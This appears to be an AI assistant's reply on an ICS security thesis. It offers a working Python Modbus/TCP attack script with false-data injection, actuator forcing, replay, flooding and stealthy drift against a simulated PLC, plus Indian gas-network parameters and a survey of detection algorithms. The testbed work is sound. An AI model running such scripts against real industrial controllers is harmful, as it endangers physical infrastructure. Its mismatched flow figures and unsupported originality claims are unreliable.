Now let me search for recent research papers on the algorithms:Now I have everything I need to compile a comprehensive response. Let me write it up.

---

This is a detailed response covering all three topics. I'll go through each one systematically.

---

## 1. External Attacker Simulation Mechanism

Right now your attacks are injected from within MATLAB itself — a trusted insider perspective. To model a genuinely **external threat actor**, you need to simulate an agent that operates at the network boundary and attacks over the Modbus/TCP channel, without any knowledge of or access to the MATLAB physics engine.

### Architecture: Separate External Attacker Process

The cleanest design is a standalone Python process — call it `external_attacker.py` — that runs independently of both MATLAB and the gateway. It only knows the PLC's Modbus/TCP address, which is exactly what a real attacker would have after network reconnaissance.

```
[MATLAB Physics] ←→ [Python Gateway] ←→ [CODESYS SoftPLC :1502]
                                                    ↑
                                          [external_attacker.py]
                                          (completely separate process,
                                           communicates ONLY over TCP)
```

The attacker process has **no imports from your simulator codebase**. It opens its own Modbus TCP client connection to `127.0.0.1:1502` (or a different IP if on a separate machine), reads registers to do reconnaissance, then writes malicious values — exactly as a real adversary would after compromising SCADA network access.

### Core External Attacker Script

```python
# external_attacker.py
# Runs as a fully independent process. No MATLAB, no gateway imports.
# Simulates an external attacker who only has network access to the PLC.

import time, random, argparse, json, csv
from datetime import datetime
from pymodbus.client import ModbusTcpClient

# ── Register map (attacker learned this via reconnaissance / Shodan) ─────────
PRESSURE_REGS   = list(range(0, 20))   # HR 0-19: node pressures (×100 → INT)
FLOW_REGS       = list(range(20, 40))  # HR 20-39: pipe flows (×1 → INT)
COMP_RATIO_REGS = list(range(40, 46))  # HR 40-45: compressor ratios (×100)
VALVE_REGS      = list(range(46, 51))  # HR 46-50: valve positions (×1)
ACTUATOR_COILS  = list(range(0, 7))    # Coils 0-6: actuator on/off

DEVICE_ID = 1

class ExternalAttacker:
    def __init__(self, host="127.0.0.1", port=1502):
        self.client = ModbusTcpClient(host=host, port=port)
        self.connected = False
        self.attack_log = []

    def connect(self):
        """Attacker establishes connection - reconnaissance phase."""
        self.connected = self.client.connect()
        if self.connected:
            print(f"[ATTACKER] Connected to PLC at {self.client.host}:{self.client.port}")
            self._fingerprint()
        else:
            print("[ATTACKER] Connection failed. Target may be offline.")
        return self.connected

    def _fingerprint(self):
        """Read baseline registers to understand normal operating values."""
        result = self.client.read_holding_registers(
            address=0, count=60, device_id=DEVICE_ID
        )
        if not result.isError():
            self.baseline = list(result.registers)
            print(f"[ATTACKER] Fingerprinted {len(self.baseline)} registers.")

    def _log(self, attack_name, register, original, injected):
        self.attack_log.append({
            "timestamp": datetime.utcnow().isoformat(),
            "attack": attack_name,
            "register": register,
            "original_value": original,
            "injected_value": injected
        })

    # ── Attack Implementations ────────────────────────────────────────────────

    def false_data_injection_pressure(self, node_index=5, spoof_bar=95.0):
        """
        Spoof a high pressure reading on node N{node_index+1}.
        Attacker writes a falsely elevated INT value to fool the HMI operator.
        """
        reg = PRESSURE_REGS[node_index]
        original = self.client.read_holding_registers(
            address=reg, count=1, device_id=DEVICE_ID
        ).registers[0]
        spoofed = int(spoof_bar * 100)   # e.g. 95 bar → 9500
        self.client.write_register(address=reg, value=spoofed, device_id=DEVICE_ID)
        self._log("FDI_pressure_spoof", reg, original, spoofed)
        print(f"[ATTACKER] FDI: Node N{node_index+1} pressure spoofed "
              f"{original/100:.1f} → {spoof_bar:.1f} bar")

    def actuator_manipulation_valve(self, valve_index=2, position=0):
        """
        Force a valve fully closed (or open) via coil write.
        Simulates attacker taking physical control of actuator.
        """
        coil = ACTUATOR_COILS[valve_index]
        self.client.write_coil(address=coil, value=bool(position), device_id=DEVICE_ID)
        self._log("actuator_valve_close", coil, "open", position)
        print(f"[ATTACKER] Actuator: Valve coil {coil} set to {position}")

    def replay_attack(self, duration_s=30, replay_interval=1.0):
        """
        Record current register values, then repeatedly replay them
        to mask any physical changes happening in the real process.
        """
        print("[ATTACKER] Replay: Recording snapshot...")
        snapshot = self.client.read_holding_registers(
            address=0, count=60, device_id=DEVICE_ID
        ).registers
        end_time = time.time() + duration_s
        while time.time() < end_time:
            for i, val in enumerate(snapshot):
                self.client.write_register(address=i, value=val, device_id=DEVICE_ID)
            self._log("replay_attack", "ALL_60", "live", "snapshot")
            time.sleep(replay_interval)
        print("[ATTACKER] Replay: Attack complete.")

    def modbus_flooding_dos(self, duration_s=10, rate_hz=200):
        """
        Send FC03 read requests at extreme rate to exhaust PLC TCP stack.
        Pure protocol-layer DoS — no physics knowledge needed.
        """
        end_time = time.time() + duration_s
        count = 0
        while time.time() < end_time:
            self.client.read_holding_registers(address=0, count=10, device_id=DEVICE_ID)
            count += 1
            time.sleep(1.0 / rate_hz)
        self._log("modbus_dos_flood", "FC03", 0, count)
        print(f"[ATTACKER] DoS: Sent {count} FC03 requests in {duration_s}s")

    def slow_pressure_manipulation(self, reg=3, target_int=2500, step=10, delay=2.0):
        """
        Slowly drift a pressure register toward a low target over time.
        Designed to evade threshold-based detectors (change is gradual).
        """
        current = self.client.read_holding_registers(
            address=reg, count=1, device_id=DEVICE_ID
        ).registers[0]
        print(f"[ATTACKER] Slow drift: HR{reg} {current} → {target_int} "
              f"in steps of {step}")
        while abs(current - target_int) > step:
            current += step if target_int > current else -step
            self.client.write_register(address=reg, value=current, device_id=DEVICE_ID)
            self._log("slow_drift_FDI", reg, None, current)
            time.sleep(delay)

    def save_log(self, path="attack_log.csv"):
        if not self.attack_log:
            return
        with open(path, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=self.attack_log[0].keys())
            writer.writeheader()
            writer.writerows(self.attack_log)
        print(f"[ATTACKER] Log saved → {path}")

    def disconnect(self):
        self.client.close()


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="External Modbus Attacker")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=1502)
    parser.add_argument("--attack", required=True,
        choices=["fdi_pressure","actuator_valve","replay","dos","slow_drift"])
    parser.add_argument("--duration", type=int, default=30)
    args = parser.parse_args()

    attacker = ExternalAttacker(host=args.host, port=args.port)
    if attacker.connect():
        if args.attack == "fdi_pressure":
            attacker.false_data_injection_pressure()
        elif args.attack == "actuator_valve":
            attacker.actuator_manipulation_valve()
        elif args.attack == "replay":
            attacker.replay_attack(duration_s=args.duration)
        elif args.attack == "dos":
            attacker.modbus_flooding_dos(duration_s=args.duration)
        elif args.attack == "slow_drift":
            attacker.slow_pressure_manipulation()
        attacker.save_log()
        attacker.disconnect()
```

### Running Attacks from the Command Line

```bash
# Terminal 1: your normal simulator running
python gateway.py

# Terminal 2: external attacker — completely separate, just TCP
python external_attacker.py --attack fdi_pressure
python external_attacker.py --attack dos --duration 20
python external_attacker.py --attack replay --duration 60
```

This separation is critical for your thesis argument: the attacker has **zero access** to MATLAB internals, simulation state, or your gateway code. It operates purely at the Modbus/TCP layer, which is exactly what makes it protocol-authentic and externally motivated.

For multi-stage attacks, you can chain them with delays:
```bash
python external_attacker.py --attack fdi_pressure && sleep 30 && \
python external_attacker.py --attack actuator_valve
```

---

## 2. Indian CGD Network Parameters (Replacing GasLib/European Standards)

This is your **most significant novel contribution** — no published work exists on cyber-physical security simulation of Indian CGD networks under PNGRB/BIS regulation. Here's the complete parameter replacement table.

### Why the Current GasLib Parameters Are Wrong for India

GasLib is based on Open Grid Europe data: high-pressure transmission (~60–100 bar), large-diameter European trunk pipelines, German gas composition. Indian CGD networks are structurally different — they are **medium-pressure urban distribution networks**, not transmission pipelines, governed by PNGRB T4S and operating at 14–26 bar in the steel grid, not 40–100 bar.

### Indian CGD Pressure Regime (PNGRB T4S / Real IGL/MGL Data)

Indian CGD networks follow a defined pressure cascade: the City Gate Station (CGS) receives gas from the transmission line at 60–99 barg and reduces it to ~26 barg for the steel grid. The steel grid then feeds District Regulating Stations (DRS) at 14–26 barg, which reduce to 1–4 barg for medium-pressure PE pipelines, which in turn feed service regulators reducing to 110 mbar for domestic connections. The basic steel grid pipeline network, which is what your SCADA simulator targets, operates at 18 bar(g) and is designed, constructed and operated in conformance with ASME B31.8 and PNGRB guidelines.

### Complete Parameter Replacement Table

| Parameter | Current (GasLib/European) | **Indian CGD (PNGRB T4S)** | Source |
|-----------|--------------------------|---------------------------|--------|
| **Inlet pressure** | 40–100 bar | **20–26 barg** (steel grid after CGS) | PNGRB T4S, IGL/MGL operational data |
| **Outlet pressure** | 10–60 bar | **14–18 barg** (to DRS inlet) | CGD pressure cascade |
| **Max design pressure** | 100 bar | **26 barg** (steel grid primary network) | PNGRB T4S defines the primary network operating pressure above 7 bar and below 49 bar for steel pipelines |
| **Gas flow range** | 0–5000 Nm³/h | **0–2000 SCMD** (small city) to **0–15,000 SCMD** (metro) | IGL/MGL annual reports |
| **Gas temperature** | 5–50°C | **20–45°C** (India ambient, no sub-zero) | BIS IS 15663 |
| **Pipe diameter (trunk)** | DN500–600 | **DN100–300 mm** (IS 3589 / API 5L) | PNGRB T4S Annexure |
| **Pipe diameter (branch)** | DN200–300 | **DN50–150 mm** | IS 1239 Part 1 |
| **Pipe material** | Generic steel | **API 5L Gr. B / IS 3589 Gr. 410** | PNGRB T4S specifies IS 1239 Part 2 steel pipe fittings for CGD network components |
| **Specific gravity** | 0.60 | **0.55–0.58** (Indian NG from ONGC/GAIL, methane-rich) | GAIL gas composition specs |
| **Compressibility Z** | 0.88 at 60 bar | **0.93–0.97** at 20–26 bar (nearly ideal gas) | Peng-Robinson EOS at Indian operating P |
| **Compressor ratio** | 1.0–2.5 | **1.1–1.6** (booster only, not main compression) | Typical CGD booster stations |
| **Pipe roughness ε** | 0.01–0.05 mm | **0.045 mm** (commercial steel, IS 3589) | Standard for new steel pipe |
| **Pipe length** | 1–50 km | **0.5–15 km** (urban CGD segments) | IGL/MGL network geography |
| **Node spacing** | Transmission scale | **500 m – 3 km** (urban grid) | MGL O&M documentation |

### MATLAB Changes Required

In your `params` struct, replace the pressure and flow scaling:

```matlab
% OLD (GasLib/European transmission network)
params.P_source_bar  = [60, 70, 80];       % bar
params.P_sink_min    = [10, 15, 20];        % bar
params.Q_max_nm3h    = 5000;

% NEW (Indian CGD steel grid, PNGRB T4S compliant)
params.P_source_bar  = [24, 25, 26];       % barg — CGS outlet to steel grid
params.P_sink_min    = [14, 15, 16];        % barg — minimum delivery to DRS
params.Q_max_scmd    = 150000;              % Standard Cubic Metres per Day
params.Q_max_nm3h    = params.Q_max_scmd / 24;  % ≈ 6250 Nm³/h for medium city

% Gas properties — Indian natural gas
params.specific_gravity = 0.57;             % ONGC/GAIL typical
params.Z_factor         = 0.95;             % at 20 bar, 35°C
params.T_avg_K          = 308.15;           % 35°C — Indian annual average

% Pipe geometry — IS 3589 sizes
params.D_vec_mm = [200, 150, 150, 100, 100, 200, 150, ...
                   100,  80, 100, 150, 100, 200, 150, ...
                   100, 100,  80, 200, 150, 100];  % 20 pipes, DN in mm
params.D_vec_m  = params.D_vec_mm / 1000;

% Pipe lengths — urban CGD spacing
params.L_vec_km = [2.0, 1.5, 3.0, 1.2, 0.8, 2.5, 1.8, ...
                   1.0, 0.6, 1.5, 2.0, 1.2, 1.8, 0.9, ...
                   1.5, 1.1, 0.7, 2.2, 1.6, 1.0];
```

### Register Scaling Update

Your current register scaling (P ×100 → INT for 40–100 bar range giving 4000–10000) must change:

| Signal | Old Scaling | **Indian CGD Scaling** | Range |
|--------|------------|----------------------|-------|
| Pressure | ×100 (for 40–100 bar) | **×100** (for 14–26 bar → 1400–2600) | Still fits INT16 |
| Flow | ×1 (Nm³/h, 0–5000) | **×0.1** (SCMD, 0–150000 → 0–15000) | Fits INT16 |
| Temperature | ×10 (5–50°C → 50–500) | **×10** (20–45°C → 200–450) | No change needed |

### Thesis Justification Statement (Use This)

> *The network parameters are adapted from PNGRB Technical Standards for City or Local Natural Gas Distribution Networks (T4S, 2008, amended 2024) to reflect Indian CGD operating conditions. The steel grid pressure range of 14–26 barg, pipe diameters conforming to IS 3589 and IS 1239, and natural gas specific gravity of 0.57 are representative of Tier-1 Indian CGD operators (IGL, MGL, IOAGPL) and are explicitly different from the GasLib European transmission network parameters on which prior CPS simulation work is based. This adaptation constitutes an original contribution, as no prior published cyber-physical security simulation specifically targets Indian CGD regulatory conditions.*

---

## 3. Algorithms for Time-Series Anomaly Detection — Literature Survey

Here are 12 algorithms, grouped by relevance to your dual-layer objectives, drawn from recent high-impact publications.

---

### Group A: Physics Layer + Process Data (Most Relevant to Objective 2)

**1. LSTM-Autoencoder + OCSVM Hybrid (LSTM-AE + OCSVM)**
- *Where:* Computers & Security, IEEE Transactions on Industrial Informatics (2022–2024)
- *How it works:* An LSTM-Autoencoder learns the temporal structure of normal process time series (pressure, flow). Reconstruction error serves as the anomaly score. A One-Class SVM sits on top to make the final classification boundary, adding robustness against reconstruction error drift.
- The most sophisticated approaches employ physics-informed neural networks that embed generic knowledge of inertial process dynamics, achieving 98.3% accuracy with 0.8% false positives — a 20 percentage point improvement over baseline methods.
- *Fit to your work:* Train on Weymouth residuals + raw register time series simultaneously. The reconstruction error on pressure/flow channels directly corresponds to physics-layer anomaly signal.

**2. GRU-Based Interpretable Anomaly Detection (GRN)**
- *Where:* Tang et al., *Computers & Security* 127, 2023
- *How it works:* GRN preserves the original advantages of GRU for processing sequences and capturing time-series dependencies, solves gradient vanishing/exploding, and can effectively acquire complex dependencies between sensors to assist users in judging and locating anomalies. It outperforms LSTM-NDT, OmniAnomaly, MAD-GAN, USAD, and GDN on SWaT and WADI.
- *Fit to your work:* Directly comparable baseline — SWaT is a cyber-physical testbed like yours. The interpretability component is valuable for your Objective 3 (topology-invariant detection).

**3. Graph Deviation Network (GDN)**
- *Where:* Deng & Hooi, AAAI 2021; widely cited in IEEE TII and Computers & Security since 2022
- *How it works:* Learns a graph structure representing sensor-to-sensor dependencies (which pipe pressure correlates with which flow), then uses graph attention to detect when the observed topology deviates from the learned normal graph. Anomaly score = deviation from the learned relational structure.
- *Fit to your work:* Ideal for Objective 3 — when topology changes (SC-01 → SC-07), the graph structure changes too. You can condition GDN on the active topology scenario. Also directly supports your GNN enhancement direction.

**4. Physics-Informed Neural Network Residual Monitor (PINN-RM)**
- *Where:* arXiv 2502.07230 (2025), IEEE Transactions on Smart Grid (2023–2025)
- *How it works:* Embeds known physics equations (in your case, the Weymouth equation) as a loss constraint during training. The model simultaneously learns the data distribution AND must satisfy Q = f(P₁, P₂, D, L). Violations of the physics constraint trigger anomaly flags independent of the ML reconstruction.
- *Fit to your work:* **Most directly aligned with your Paper 2 contribution.** Your Weymouth residual (|Q_measured − Q_Weymouth|) is exactly the physics constraint violation signal. PINN-RM formalises this into a trainable framework.

---

### Group B: Protocol Layer (Modbus-Aware)

**5. Modbus-NFA Behavior Model**
- *Where:* Amer et al., *Journal of Information Security and Applications* 89, 2025
- *How it works:* Models the behavioral patterns of Modbus traffic using Non-deterministic Finite Automata to detect anomalies in ICS protocol sequences. Learns the normal FC03/FC06 request sequences and flags deviations in function code ordering, read/write ratios, and inter-request intervals.
- *Fit to your work:* Directly applicable to your protocol-layer features (FC03/FC06 sequence length, IRI, unusual write frequency). This is a baseline for your protocol-layer detection channel.

**6. Sequence-to-Sequence LSTM Autoencoder for Modbus Traffic**
- *Where:* Boudid et al., *ScienceDirect* (2024), building on SWaT dataset methodology
- *How it works:* Proposes a network-based anomaly detection system using a sequence-to-sequence autoencoder with LSTM units, embedding layer, teacher forcing technique, and attention mechanism for detecting data manipulation attacks in Modbus/TCP-based SCADA systems, detecting 23 of 36 attacks.
- *Fit to your work:* Your CODESYS SoftPLC logs Modbus request/response timing — this model can operate purely on protocol packet content without any physics features, giving you a clean protocol-only baseline to compare against your hybrid.

---

### Group C: Dual-Layer Fusion (Both Physics + Protocol — Rare, High Value)

**7. Digital Twin-Driven Hybrid IDS (DT-ID)**
- *Where:* PMC/MDPI, published August 2025
- *How it works:* Proposes a Digital Twin-driven Intrusion Detection framework that integrates high-fidelity process simulation, real-time sensor modeling, adversarial attack injection, and hybrid anomaly detection using both physical residuals and machine learning — addressing the limitation that traditional IDS focusing solely on network traffic often fails to detect stealthy, process-level attacks.
- *Fit to your work:* **Closest architectural comparator for your thesis.** Cite as the closest prior work and differentiate by: (a) your CODESYS SoftPLC produces real Modbus timing artifacts that a pure simulation cannot, (b) your Indian CGD parameterisation.

**8. CAE-T: Convolutional Autoencoding Transformer with SVDD**
- *Where:* Shang et al., *International Journal of Intelligent Systems* (Wiley), May 2024
- *How it works:* CAE-T utilizes unsupervised deep learning, employing a convolutional autoencoder for spatial feature extraction from multidimensional time-series data, combined with a transformer architecture to capture long-term temporal dependencies, with an optimization function based on support vector data description (SVDD) that enhances detection accuracy.
- *Fit to your work:* The CNN component extracts spatial features across your 20 nodes; the Transformer captures temporal dependencies across scan cycles. Train on your 114-column feature matrix (physics + protocol columns combined).

**9. Explainable Hybrid IDS — SHAP/LIME over LSTM-AE**
- *Where:* Frontiers in Computer Science, February 2026 (survey and experimental results)
- *How it works:* State-aware invariants derive tighter bounds specific to each system state, achieving 2% false-positive rates. Protocol awareness leveraging Modbus function codes remains rare — only 2 of 10 recent ICS IDS studies include even minimal protocol feature integration. The explainability layer (SHAP values per feature) attributes each anomaly alert to specific sensors or registers.
- *Fit to your work:* Particularly valuable for Objective 3 — when the model detects an anomaly after a topology switch, SHAP will attribute it to the correct changed sensors rather than causing a false positive. This is your answer to the topology-invariant detection gap.

---

### Group D: Graph Neural Network Approaches (Your GNN Enhancement Direction)

**10. Graph Attention Network + Informer (GAT-Informer)**
- *Where:* PMC/MDPI, March 2024
- *How it works:* GAT learns sequential characteristics effectively, while Informer performs excellently in long time series prediction. Long-time and short-time forecasting losses are both used to detect multivariate time-series anomalies, addressing the sharp performance decrease with increasing feature dimension.
- *Fit to your work:* Your 20-node pipeline graph is a natural fit for GAT — edges are pipe segments, nodes are sensors. The Informer component handles the long temporal windows needed to detect slow-drift FDI attacks.

**11. Semi-Supervised GAN for Data Augmentation (SGAN)**
- *Where:* MDPI Processes, September 2025
- *How it works:* Uses a publicly available ICS testbed dataset as a benchmark for the discriminator in a Semi-Supervised Generative Adversarial Network to generate large volumes of synthetic time-series data through adversarial training, mitigating data scarcity in ICS anomaly detection.
- *Fit to your work:* Directly applicable to your class imbalance problem — attack samples are ~3% of your dataset. SGAN can generate additional synthetic attack sequences that are statistically consistent with your real ones, improving minority-class F1 without SMOTE's linear interpolation limitation.

**12. TranAD — Transformer-Based Anomaly Detection**
- *Where:* VLDB 2022, widely cited in IEEE and ACM Computing Surveys through 2024–2025
- *How it works:* Uses a two-phase self-conditioning transformer with focus score attention: a meta-training phase that learns a compact representation of normal patterns, and an inference phase where reconstruction error is amplified for anomalies via adversarial training. Outperforms LSTM-AE, GDN, OmniAnomaly on SWaT and SMAP.
- *Fit to your work:* Your 114-feature time-series rows feed directly into TranAD's windowed input. Particularly effective on your multi-stage cascading attack scenarios where anomalies have complex temporal structure spanning multiple scan cycles.

---

### Summary Fit Matrix

| # | Algorithm | Physics Layer | Protocol Layer | Dual-Layer | Best For Objective |
|---|-----------|:---:|:---:|:---:|---|
| 1 | LSTM-AE + OCSVM | ✓ | — | — | Obj 2 baseline |
| 2 | GRN (GRU interpretable) | ✓ | — | — | Obj 2, 3 |
| 3 | GDN (Graph Deviation) | ✓ | — | — | Obj 3 (topology) |
| 4 | PINN-RM (physics residual) | ✓✓ | — | — | **Obj 2, Paper 2** |
| 5 | Modbus-NFA | — | ✓✓ | — | Obj 1 (protocol) |
| 6 | Seq2Seq LSTM (Modbus) | — | ✓✓ | — | Obj 1 baseline |
| 7 | DT-ID Hybrid | ✓ | ✓ | **✓✓** | **Obj 2, comparator** |
| 8 | CAE-T + SVDD | ✓ | ✓ | **✓** | Obj 2 fusion |
| 9 | XAI Hybrid + SHAP | ✓ | partial | **✓** | Obj 3 explainability |
| 10 | GAT-Informer | ✓ | — | — | Obj 3, GNN direction |
| 11 | SGAN (augmentation) | ✓ | ✓ | **✓** | Dataset imbalance |
| 12 | TranAD | ✓ | ✓ | **✓** | Multi-stage attacks |

The dual-layer gap noted in the Frontiers 2026 review is **your exact research gap**: a striking asymmetry characterizes current ICS IDS approaches — process-aware features are common in eight of ten recent studies, while protocol-aware features are virtually absent, with only two of ten studies showing minimal integration. Protocol awareness leveraging Modbus function codes remains rare. Your thesis closes that gap directly, which is a strong originality claim for both papers.